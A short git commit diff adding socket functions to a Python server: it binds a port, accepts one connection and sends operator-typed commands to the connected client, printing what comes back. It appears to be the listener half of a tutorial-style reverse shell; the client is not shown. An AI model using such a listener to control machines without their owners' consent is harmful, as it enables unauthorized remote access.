02e26cce6fdbd12e9c5b6e794dabb54f79fddfe8
Will Carpenter <willcarpenteriii@gmail.com>
2017-11-15 11:40:28 -0700

    added socket functions to server

--- server.py
+++ server.py
@@ -14,15 +14,47 @@ def create_socket():
     except socket.error as msg:
         print('Socket creation' + str(msg))
 
+
 def bind_socket():
     try:
         global host
         global port
         global s
 
-        print('Binding the port')
+        print('Binding the port' + str(port))
 
-    except:
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print('Socket binding error' + str(msg) + '\n' + 'Retrying...')
+        bind_socket()
 
 
+def socket_accept():
+    conn, address = s.accept()
+    print('Connection established! |' + ' IP: ' + address[0] + ' | Port: ' + str(address[1]))
+    send_commands(conn)
+    conn.close()
 
+
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end='')
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
